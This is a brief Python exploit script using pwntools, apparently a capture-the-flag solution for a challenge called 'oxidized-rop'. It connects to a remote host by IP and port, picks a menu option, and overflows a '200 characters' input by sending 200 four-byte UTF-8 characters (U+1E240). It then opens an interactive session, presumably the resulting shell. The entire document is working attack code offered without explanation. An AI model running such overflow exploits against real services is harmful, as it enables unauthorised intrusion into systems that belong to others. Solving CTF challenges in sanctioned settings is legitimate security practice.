from pwn import *

Elf        = context.binary = ELF('./oxidized-rop')
Process    = remote('94.237.53.58', 56177)


Process.sendlineafter(b'Selection: ', b'1')

# U+1E240
p = b'\xf0\x9e\x89\x80' * 200

Process.sendlineafter(b'Statement (max 200 characters):', p)


Process.interactive()
